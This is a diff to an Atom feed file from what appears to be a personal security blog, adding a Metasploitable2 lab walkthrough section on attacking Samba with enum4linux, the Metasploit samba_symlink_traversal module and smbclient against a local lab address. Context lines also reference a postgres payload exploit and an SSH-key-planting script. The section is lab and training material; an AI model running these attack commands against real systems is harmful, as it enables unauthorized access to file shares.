@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-23T12:58:01-05:00</updated>
+  <updated>2016-06-23T15:21:23-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -278,6 +278,32 @@ msf exploit(postgres_payload) &gt; exploit
 <p>Getting access to a system with a writeable filesystem</p>
 
 <p><a href="https://github.com/wg135/script/blob/master/add_ssh_key.py">add_ssh_key.py</a></p>
+
+<h3>SMB exploit:</h3>
+
+<p>Enumerate smtp:</p>
+
+<p><code>enum4linux 192.168.79.179</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like <a href="https://www.samba.org/samba/news/symlink_attack.html">wide links</a></p>
+
+<pre><code>use auxiliary/admin/smb/samba_symlink_traversal
+msf auxiliary(samba_symlink_traversal) &gt; set rhost 192.168.79.179
+msf auxiliary(samba_symlink_traversal) &gt; set SMBSHARE tmp
+msf auxiliary(samba_symlink_traversal) &gt; exploit
+</code></pre>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks good</p>
+
+<p>now use smbclient to login</p>
+
+<p><code>smbclient //192.168.79.179/tmp</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
